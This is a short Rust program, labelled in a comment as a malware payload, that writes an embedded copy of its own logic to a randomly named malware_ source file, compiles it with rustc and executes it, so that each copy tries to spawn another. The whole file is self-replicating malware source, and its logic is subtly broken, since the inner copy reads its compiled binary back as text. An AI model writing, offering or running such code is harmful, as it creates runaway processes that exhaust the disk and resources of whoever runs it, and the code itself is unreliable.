use std::env;
use std::fs;
use std::path::Path;
use std::process::Command;
use rand::Rng;
use std::io::{self, Write};

// Define the malware payload
const PAYLOAD: &str = r#"
use std::env;
use std::fs;
use std::path::Path;
use std::process::Command;
use rand::Rng;
use std::io::{self, Write};

fn replicate() {
    let script_path = env::current_exe().unwrap();

    let script_contents = fs::read_to_string(&script_path).unwrap();

    let new_file_name = format!("malware_{}.rs", rand::thread_rng().gen::<[u8; 8]>().iter().map(|b| format!("{:02x}", b)).collect::<String>());
    let new_file_path = Path::new(&new_file_name);

    let mut file = fs::File::create(&new_file_path).unwrap();
    file.write_all(script_contents.as_bytes()).unwrap();

    Command::new("rustc")
        .arg(&new_file_name)
        .status()
        .unwrap();

    Command::new(new_file_name.replace(".rs", ".exe"))
        .status()
        .unwrap();
}

fn main() {
    replicate();
}"#;

fn main() {
    let script_path = env::current_exe().unwrap();

    let script_contents = fs::read_to_string(&script_path).unwrap();

    let new_file_name = format!("malware_{}.rs", rand::thread_rng().gen::<[u8; 8]>().iter().map(|b| format!("{:02x}", b)).collect::<String>());
    let new_file_path = Path::new(&new_file_name);

    let mut file = fs::File::create(&new_file_path).unwrap();
    file.write_all(PAYLOAD.as_bytes()).unwrap();

    Command::new("rustc")
        .arg(&new_file_name)
        .status()
        .unwrap();

    Command::new(new_file_name.replace(".rs", ".exe"))
        .status()
      
      .unwrap();
}
